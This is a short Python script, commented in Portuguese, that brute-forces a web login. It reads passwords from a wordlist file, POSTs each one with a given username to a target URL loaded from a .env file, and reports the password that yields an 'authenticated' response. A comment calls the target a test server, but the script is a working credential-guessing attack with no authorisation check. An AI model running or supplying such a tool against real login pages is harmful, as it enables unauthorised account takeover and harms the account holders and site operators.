import os
import requests
from dotenv import load_dotenv
import json

# Carrega variáveis do .env
load_dotenv()

# Configuração
TARGET_URL = os.getenv("TARGET_URL")  # Endereço do servidor de teste
WORDLIST_PATH = "./wordlist/wordlist.txt"

def try_passwords(username):
    try:
        with open(WORDLIST_PATH, 'r') as file:
            for line in file:
                password = line.strip()

                # Enviando requisição de login
                response = requests.post(
                    TARGET_URL,
                    data={"username": username, "password": password}
                )

                print(f"Tentando senha: {password}")
                print(f"Status Code: {response.status_code}")

                # Tenta converter a resposta para JSON
                try:
                    resposta_json = response.json()
                    print(f"Resposta JSON: {resposta_json}")  # Exibe para debug
                except ValueError:
                    resposta_json = {}  # Se falhar, assume que não é JSON válido

                # Exibir trecho da resposta (caso não seja JSON)
                if not resposta_json:
                    html_resposta = response.text
                    print(f"Trecho da resposta:\n{html_resposta[:500]}...\n")

                # Verificar se o login foi bem-sucedido
                if resposta_json.get("authenticated") == True:
                    print(f"✅ Senha encontrada: {password}")
                    return f"SUCESSO: Senha {password}"

                print("❌ Login falhou, continuando...\n")

        return "Nenhuma senha funcionou."
    except Exception as e:
        return f"Erro durante o processo: {str(e)}"

# Exemplo de uso:
# print(try_passwords("meu_usuario"))
